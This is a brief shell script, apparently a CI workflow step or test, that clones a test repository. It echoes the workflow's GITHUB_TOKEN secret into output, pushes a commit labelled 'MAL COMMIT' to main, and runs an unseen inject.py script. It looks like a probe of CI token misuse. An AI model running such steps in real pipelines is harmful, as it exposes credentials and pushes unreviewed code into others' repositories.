pip3 install requests
git clone https://github.com/tester49481/test.git
echo ${{ secrets.GITHUB_TOKEN }}
cd test
gh auth status
echo "TEST" >> test_mal
git add .
git commit -m "MAL COMMIT"
git push origin main
python3 ./src/inject.py
